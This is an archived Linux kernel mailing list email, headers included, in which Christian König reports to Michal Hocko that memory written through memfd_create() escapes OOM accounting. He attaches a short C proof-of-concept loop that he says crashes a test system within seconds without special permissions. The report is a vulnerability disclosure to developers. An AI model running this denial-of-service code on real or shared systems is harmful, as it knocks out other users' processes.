Return-Path: <linux-kernel-owner@vger.kernel.org>
X-Original-To: lists+linux-kernel@lfdr.de
Delivered-To: lists+linux-kernel@lfdr.de
Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
	by mail.lfdr.de (Postfix) with ESMTP id DF46330F809
	for <lists+linux-kernel@lfdr.de>; Thu,  4 Feb 2021 17:36:07 +0100 (CET)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S238113AbhBDQd5 (ORCPT <rfc822;lists+linux-kernel@lfdr.de>);
        Thu, 4 Feb 2021 11:33:57 -0500
Received: from mail-bn7nam10on2051.outbound.protection.outlook.com ([40.107.92.51]:37344
        "EHLO NAM10-BN7-obe.outbound.protection.outlook.com"
        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with ESMTP
        id S238000AbhBDQdR (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
        Thu, 4 Feb 2021 11:33:17 -0500
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=nZ0K1w52XNB/laVB5INoGMPjggtU9t1H5EeoCYAyk8OlqaiVteFDEKP5+noEoREKEAZ55eCBPz1BU4sfdhijLVz21NYzNJ7dONADu6qBYYqocymy7rj4qIozfHRLblk6F42mffmqT+XCLqhKbN1LMCupZLNdFtuTLPkEhkuY0rLziI0m5zqqtLGuOe9dYKWNYr94iJARM6DHg7aNIJZPgjwxymIcZUSixzlX/2AadVFJh2TAGxEXb/q+j1l35kVc5T7rcn1DnJvUaq3eS7reOFjcOMuTw9z0gghaXfHVbdcKSycxdxV24AYPbXYoeJUxzAptrQhWww6fEBNERLB2Gg==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=GNUM98WS/HxtVZ3wCAVRk34uzDYnfNvN7QMkQmqanjM=;
 b=Wr++aq8K/JwvbJFvlnJqNYZBzPnT117ranN1C36nR4jaXe6Zw6ygrPKEe9qk3AJjJglXWrlaxbcaUO7Jzf6SS805MPdcpMzFfYgmnbCObjwM2/Eva79Xkbmu8ZZ+y3ZcgPVmiBo9oFe9JwmHzuy3VIQyA8O+UynLt+w134AG29gZeaZNNfec+ncAPCI2PBq2dBzAg8nEAB7GcJmX+a+csBwHBkkkOgckgVZn0kdBhmACx3qLnu84ujTGmpSPpDwUmmBpkJrQtgW/ruajqY49+GOVLb4AxwnYeB9Locvw58fW2Ta9q2endi9SVd9F9VreSELu1WkCqJgKjTcvVzLp1g==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=amd.com; dmarc=pass action=none header.from=amd.com; dkim=pass
 header.d=amd.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=amd.com; s=selector1;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=GNUM98WS/HxtVZ3wCAVRk34uzDYnfNvN7QMkQmqanjM=;
 b=Vv5tcviQPxf14k3eLh3NeO9/obW533yGYRF45tTYU4/dBIVR5K8mhu9SQsnoyvrJa1n3i88eFTZKLKAb76h4CAg2/OM98G5YeK0K5pD7VK4YP8NvyY4QW1GA/Oky4fDM0EgiT0JnpeMidv3BgaokfN/B7fqtw1xSbxRTUB3shZE=
Authentication-Results: vger.kernel.org; dkim=none (message not signed)
 header.d=none;vger.kernel.org; dmarc=none action=none header.from=amd.com;
Received: from MN2PR12MB3775.namprd12.prod.outlook.com (2603:10b6:208:159::19)
 by MN2PR12MB4254.namprd12.prod.outlook.com (2603:10b6:208:1d0::17) with
 Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.3825.23; Thu, 4 Feb
 2021 16:32:24 +0000
Received: from MN2PR12MB3775.namprd12.prod.outlook.com
 ([fe80::44f:9f01:ece7:f0e5]) by MN2PR12MB3775.namprd12.prod.outlook.com
 ([fe80::44f:9f01:ece7:f0e5%3]) with mapi id 15.20.3805.024; Thu, 4 Feb 2021
 16:32:24 +0000
To:     Michal Hocko <mhocko@suse.com>, LKML <linux-kernel@vger.kernel.org>
From:   =?UTF-8?Q?Christian_K=c3=b6nig?= <christian.koenig@amd.com>
Subject: Possible deny of service with memfd_create()
Message-ID: <e7e6231d-8cf9-80a6-7459-5fec9ee547ba@amd.com>
Date:   Thu, 4 Feb 2021 17:32:20 +0100
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
 Thunderbird/68.10.0
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Transfer-Encoding: 8bit
Content-Language: en-US
X-Originating-IP: [2a02:908:1252:fb60:be8a:bd56:1f94:86e7]
X-ClientProxiedBy: AM0PR04CA0043.eurprd04.prod.outlook.com
 (2603:10a6:208:1::20) To MN2PR12MB3775.namprd12.prod.outlook.com
 (2603:10b6:208:159::19)
MIME-Version: 1.0
X-MS-Exchange-MessageSentRepresentingType: 1
Received: from [IPv6:2a02:908:1252:fb60:be8a:bd56:1f94:86e7] (2a02:908:1252:fb60:be8a:bd56:1f94:86e7) by AM0PR04CA0043.eurprd04.prod.outlook.com (2603:10a6:208:1::20) with Microsoft SMTP Server (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.3825.17 via Frontend Transport; Thu, 4 Feb 2021 16:32:23 +0000
X-MS-PublicTrafficType: Email
X-MS-Office365-Filtering-HT: Tenant
X-MS-Office365-Filtering-Correlation-Id: f0fa78aa-1d66-4062-e5e5-08d8c92a739a
X-MS-TrafficTypeDiagnostic: MN2PR12MB4254:
X-Microsoft-Antispam-PRVS: <MN2PR12MB4254395340E11A2D30F4856583B39@MN2PR12MB4254.namprd12.prod.outlook.com>
X-MS-Oob-TLC-OOBClassifiers: OLM:7219;
X-MS-Exchange-SenderADCheck: 1
X-Microsoft-Antispam: BCL:0;
X-Microsoft-Antispam-Message-Info: debDycLJVvtyln7D4dNPSi7mgfmawYhFbSHCJPB3CPU97EnF7s0dCeLgPA+PagyC5o2qRJmH6Bx0LUAcaej93/rh6B63OpAL9MCA1lpQYNobktlMaMI+THnsj2rO/ozjQFVBDKmqI3isWHWxg97gNR9LFlLILu/QkJ8PrBU6ZZQ0e9SXTsvp0IAImQUApaYcFoeOYONzp0/go9rMdI9kGmRF7mswl+zCjJwHNwxRoeswUVmJX6BcFQslxXxEdJ9AYJA4f/HrdNE5/AY/GOpG3b+iMak8h3IiBqj3IxDB23CfV3wP84u8Mlo94kM/HbSd542fUED6bjozZDomrdy62tSqzipnCCiB8bE/9xpySi9v5ElEMef/T30nLTGlORnfUIFipFx0SytvM3IvmKNBPVcqnEG8lUffB8DdQUyrKTf6rXGzs/RPiM+FohZACqvti92d4NQH4Jjx57Nh9gA8P/b5/UNCGBjyrAdhLOR4JnkUFSA4tikeR8eaJmlPTWQGguOHA3DSteK79gMHMtLEknOYQ8wmbuFF8F4wfocJsuaLsrYFCyXRKkjnYYtWEjGiJMT2Dij7kimkan4KqjvGUC7X+i3t2PBD2K2IJL434VE=
X-Forefront-Antispam-Report: CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:MN2PR12MB3775.namprd12.prod.outlook.com;PTR:;CAT:NONE;SFS:(4636009)(136003)(376002)(396003)(346002)(366004)(39860400002)(36756003)(8676002)(8936002)(2906002)(316002)(16526019)(52116002)(6486002)(86362001)(83380400001)(186003)(2616005)(31696002)(110136005)(5660300002)(66946007)(66556008)(478600001)(66476007)(4744005)(31686004)(43740500002)(45980500001);DIR:OUT;SFP:1101;
X-MS-Exchange-AntiSpam-MessageData: =?utf-8?B?RXVwcWNzK0JlbWFUdHB3QklRMjZBOHo0QndwaVV3RjJEWHdUMlNKN1ZpK21k?=
 =?utf-8?B?QkFxemNDbS8vWFRoR1l2L1V3aWFjZWcyeGlLU0p0bkFHbnNTUWYvZjRYQ1Yr?=
 =?utf-8?B?THJGN0FIK3haMFpoQVpXYW95UU1mRWtSTW1CbnpmZjJFL1JibEx6VlZJQmg2?=
 =?utf-8?B?ZDd0Z0RxVjRRdWZmamQ2MzNLWnEvekZBUDhMWHd4eUl4N25PbEEzNEhjaXRC?=
 =?utf-8?B?eUF0czRQKzRydG1yZFF4RUlPNUdNSjdpRW95VkdSVDVxQXRxY1VNMzd0RVpI?=
 =?utf-8?B?SlpWQWYwYnk5THh0cnpEemZQTE5RRnJRUTBkWElRanNsc1BnODBlblExOXRE?=
 =?utf-8?B?eTQ3ZjJKNVdqNDdZM0xHZkdMS3ZOMVdEMW5IWWVQK2RMSDBseHdJUnBnYm9H?=
 =?utf-8?B?VG50a2l2U0NMWlZ2V1pycVpRR25RVmlHZHFWeHQrN1VnclB3QjNDQU9qUkps?=
 =?utf-8?B?Ym15WHUrVnVtbUJMRGVPMHQ1QVZyZks2SEFialVQYURpbXhFQ2Q4eDBJcmhR?=
 =?utf-8?B?NDdXaWdJLzk5N0FVaHhIamJIeDdKRHp1empGZmRySE9FQWxzaXRHREdtUnBa?=
 =?utf-8?B?TmlJbXp3eVpER25FdktaYWgwdmZOZkJHWW0yZElXUG1LM0hwWUtCNnkxbHpp?=
 =?utf-8?B?aFJhUUpUSk9iSlFYN3I0d2hDTVhzb2VEQTU1NWt2VlRyaGJlMnJ5ZXRrdEwr?=
 =?utf-8?B?RnpPcDBzODc2dlYyVVJHUEFndXY5OEkyMVIxbWZrY3kvM2dYdGhoUGZBTStW?=
 =?utf-8?B?bWVEcmFkOTdTcDd2UlZXTkFUQjV1KzVVcUY0TllhalExRStTRi95anBvdXA2?=
 =?utf-8?B?OWx4TFhPNTR5TkNiM3JVRU1hb2UxemZscGRYcXpNZ0FHbXNqakdVMTV1Rnhm?=
 =?utf-8?B?aXVPTzhQL1J0NHlCLys3cVFKVER6emhzVWxBR2NQN2xWNC9zU1FoaHJLVEF3?=
 =?utf-8?B?cGR0U05UUUd5WlBRNS95Rkw2aWx3aVRFTFQ3MkR0MnhDRWpUc1VyMytNU2RL?=
 =?utf-8?B?TlJSTFE3UExtYXhsa2dOQURNUFdGRldZaThwSnc3NmRQZDUzbUVOZFQ4WVlB?=
 =?utf-8?B?T0JZY2FidFlKekIvRGU4ckJwR2luT000dFRSVWtsdmpNQmR3ZWVGcU9HM3FS?=
 =?utf-8?B?dWRPUlhSSkZ5U0VETmpXR0VyZEJKbkNsRGpTUi9PYXlGaXlQNytSTXRzbnBK?=
 =?utf-8?B?eUY2MlJZYjRPeExRYm1WOVR0eVJXRWVhZVJsVWZKczZTeHA0U3huZys0elYv?=
 =?utf-8?B?eVA1YUo5bzFDZ1pwK1k2NTVNZFVoaVh5VURNb0tOWUpOMzN0UVYzdXJvejJU?=
 =?utf-8?B?N2NxWjZzdnM4UFFCMVpHVkQ3am5SV1gvT2ZUWFRDbWk5dEFnRFhNYjdTY3Yy?=
 =?utf-8?B?NWF1S1R3NC83d3RJUUVKWEdYbTNSbFBOWG5jZEpNUmdKKzRHRTdGMmFKOG4w?=
 =?utf-8?B?TFF4TGx2eTVRRWZpM21keDIycTlhdjNCQ2VOZERkV2RteXl1aWl0SUp3TWdz?=
 =?utf-8?B?WElxRnVXeXJBTnNMOWxSWG01Q1k3TkJWbkRNTXJZM1Jld29QbTVmR2RkeEZL?=
 =?utf-8?B?cjQ4c2NSNmd6MGNqV2hTVkFQcDI2WEYzZnlvaGpJb2ViYndqem9wTERmWmZJ?=
 =?utf-8?B?Qm85OSs3S3dYZnBuMldPY0hTSEpodDJYVG5vQkU3WDNkWFZzd2pvY0dNbkZY?=
 =?utf-8?B?VU9YcVc1b3BxNlpZZmxjeTZ3dUpRdmxFelltNEFVVU9ycUdTVmYwUmw0SlFB?=
 =?utf-8?B?UlNKcWJ0S3R6bmozS0FFcysxbDVSWmY5UXp1YVdzWDNyc1ZXaEd2VVVxN3k2?=
 =?utf-8?B?Y244emZ6M0gybnJTVFRTcXNWc1g0anVOUXMySXNQUTE1MDFTa1BOLzVRTk1Y?=
 =?utf-8?Q?LGuv0QMWQuDVa?=
X-OriginatorOrg: amd.com
X-MS-Exchange-CrossTenant-Network-Message-Id: f0fa78aa-1d66-4062-e5e5-08d8c92a739a
X-MS-Exchange-CrossTenant-AuthSource: MN2PR12MB3775.namprd12.prod.outlook.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 04 Feb 2021 16:32:24.0864
 (UTC)
X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
X-MS-Exchange-CrossTenant-Id: 3dd8961f-e488-4e60-8e11-a82d994e183d
X-MS-Exchange-CrossTenant-MailboxType: HOSTED
X-MS-Exchange-CrossTenant-UserPrincipalName: K/xMK5+iSXmDEsbWcOT2FRfnXxSzDeYXtn429hA0Dc+/kfNdIFxLIAxh94852iOr
X-MS-Exchange-Transport-CrossTenantHeadersStamped: MN2PR12MB4254
Precedence: bulk
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

Hi Michal,

as requested in the other mail thread the following sample code gets my 
test system down within seconds.

The issue is that the memory allocated for the file descriptor is not 
accounted to the process allocating it, so the OOM killer pics whatever 
process it things is good but never my small test program.

Since memfd_create() doesn't need any special permission this is a 
rather nice deny of service and as far as I can see also works with a 
standard Ubuntu 5.4.0-65-generic kernel.

Cheers,
Christian.

#define _GNU_SOURCE
#include <sys/mman.h>
#include <unistd.h>
#include <stdlib.h>

unsigned char page[4096];

int main(void)
{
         int i, fd;

         for (i = 0; i < 4096; ++i)
                 page[i] = i;

         fd = memfd_create("test", 0);

         while (1)
                 write(fd, page, 4096);
}

